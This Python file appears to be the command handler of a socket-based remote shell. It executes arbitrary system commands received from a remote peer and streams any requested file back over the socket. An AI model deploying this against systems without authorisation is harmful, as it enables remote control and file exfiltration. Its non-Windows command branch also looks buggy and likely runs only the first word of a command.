import subprocess
import os
import time


w = ["Windows", "windows", "win", "Win"]
l=["Linux","linux","Unix","unix"]

def ls(os, sock):
    
    
    if os in w:
        res = subprocess.run(["cmd", "/c", "dir"], text=True, capture_output=True)
    else:
        res = subprocess.run(["ls"], text=True, capture_output=True)
    
    return res.stdout  
def cd(command):
    
    try:
        os.chdir(command[1])  # Change directory
        return f"Changed directory to {os.getcwd()}"
    except FileNotFoundError:
        return f"Directory not found: {command[1]}"
    except IndexError:
        return "No directory specified"
def pwd():
    return os.getcwd()
def execute(os,cmd):
    command = cmd[1:]  
    print(command)
    w_cmd=["cmd","/c"]+command
    print(w_cmd)
    try:
        if os in w:
            output = subprocess.run(w_cmd, text=True, capture_output=True)
            output=output.stdout
        else:
           output = subprocess.getoutput(command)
        if output:
            return output
        else:
            return "executed"
    except FileNotFoundError:
        return f"Command not found: {command}"
def help():
    print("""Available Commands:
    -------------------
    1. ls  - List files and directories in the current directory.
   
    2. cd <directory> - Change the current working directory.
   - <directory>: The directory to change to (e.g., 'cd /home/user').

    3. pwd - Print the current working directory.

    4. execute <command> - Execute a system command.
        - <command>: The command to execute (e.g., 'execute Linux ls -l').

    5. help - Display this help message with a list of available commands.
    """)
def download(s,file,chunk_size):
    try:
        with open(file,"rb") as f:
            while True:
                chunk=f.read(chunk_size)
                if not chunk:
                    
                    break
                s.send(chunk)
            s.send(b"EOF")
        time.sleep(0.2)
        return "executed"
    except:

        return "error"